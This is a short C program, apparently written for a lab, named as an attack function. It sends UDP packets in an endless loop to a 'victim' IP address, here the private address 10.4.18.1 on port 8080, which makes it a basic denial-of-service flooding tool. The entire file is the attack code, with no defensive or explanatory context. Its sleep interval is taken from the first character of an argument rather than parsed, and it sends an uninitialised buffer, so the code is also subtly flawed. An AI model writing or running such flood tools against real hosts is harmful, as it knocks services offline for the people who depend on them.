#include<stdio.h> 
#include<string.h> 
#include<stdlib.h> 
#include<arpa/inet.h>
#include<sys/socket.h>
#include <unistd.h>

#include <netinet/ip.h>
#include <netinet/udp.h>

#define BUFLEN 512  //Max length of buffer
#define PORT 8080   //The port on which to send data



void normal_attack(char* victim_ip, int usec){
  struct sockaddr_in dest;
  int dest_len = sizeof(struct sockaddr_in);
  int sock_fd;
  char message[100];

  if ( (sock_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1){
    perror("Fail to create a UDP socket.");
    exit(1);
  }
  
  memset((char *) &dest, 0, sizeof(dest));
  dest.sin_family = AF_INET;
  dest.sin_port = htons(PORT);
     
  if (inet_aton(victim_ip , &dest.sin_addr) == 0) {
    perror("inet_aton() failed\n");
    exit(1);
  }
 
  while(1){    
    //send the packet
    if (sendto(sock_fd, message, sizeof(message), 0, (struct sockaddr *)&dest, dest_len)==-1){
      exit(1);
    }      
    usleep(usec);
  }
  close(sock_fd);
}
  
int main(int argc, char *argv[])
{
  if(argc != 2) {
    printf("Invalid input\n");
    return -1;
  }
  normal_attack("10.4.18.1", *argv[1]);
  return 0;
}
